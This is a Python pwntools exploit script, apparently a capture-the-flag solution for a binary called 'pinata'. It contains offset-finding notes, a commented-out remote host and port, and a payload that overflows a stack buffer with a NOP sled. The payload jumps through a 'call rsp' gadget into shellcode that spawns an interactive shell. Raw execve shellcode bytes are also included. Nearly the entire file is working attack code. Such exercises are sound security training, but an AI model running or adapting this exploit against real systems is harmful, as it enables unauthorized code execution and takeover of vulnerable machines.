'''
cyclic 1024
*RBP  0x6161616a61616169 ('iaaajaaa')
cyclic -l jaaa
36
36+4 = 40
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'

#elf = ELF('./pinata')
#libc = ELF('./glibc/libc.so.6')

#ip, port = "83.136.254.234", 35490
#io = remote(ip, port)
#io = gdb.debug('./pinata', 'break main' )
io = process('./pinata')

payload_size = 24

#debug 12345678 -> 0x363534333231

#ret not work, jmp rsp not found...
#addr = p64(0x40101a)

#seems only call rsp works... and with python2!
addr = p64(0x41830d)

#shellcode = asm(shellcraft.linux.cat('flag.txt'))      #OK
shellcode = asm(shellcraft.popad())
shellcode = asm(shellcraft.sh())
#shellcode = asm(shellcraft.execve('/bin/sh'))

#http://shell-storm.org/shellcode/files/shellcode-806.html
#shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#payload = b'\x90'*(payload_size - len(shellcode)) + shellcode + addr
payload = b'\x90'*payload_size + addr + shellcode 

io.sendlineafter('>>', payload)
io.interactive()
#print(io.recvall())


'''
'''
